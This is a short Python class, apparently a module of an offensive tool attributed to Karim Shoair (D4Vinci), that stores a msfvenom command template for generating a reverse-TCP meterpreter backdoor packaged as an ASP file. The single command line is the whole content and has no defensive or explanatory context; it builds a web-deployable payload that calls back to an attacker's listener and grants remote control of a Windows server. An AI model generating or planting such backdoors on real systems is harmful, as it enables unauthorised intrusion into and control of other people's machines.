class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Generate a reverse meterpreter backdoor into a asp file."
    function    = "Msfvenom Generator"
    liner       = 'msfvenom -p windows/meterpreter/reverse_tcp lhost="TARGET" lport=PORT -f asp > FILE_PATH.asp'
